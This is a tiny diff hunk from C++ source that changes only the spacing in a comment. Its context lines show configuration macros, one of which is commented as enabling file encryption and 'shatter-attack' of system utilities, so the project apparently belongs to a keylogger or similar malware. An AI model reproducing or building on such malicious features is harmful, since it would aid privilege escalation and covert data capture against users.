@@ -36,7 +36,7 @@
 using buffer = std::vector<char>;
 
 //------------------------------------------------------
-// Customization
+//  Customization
 
 #define CryptLogs true      //whether or not to crypt files and shatter-attack system utilities [REMOVE THIS FLAG]
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
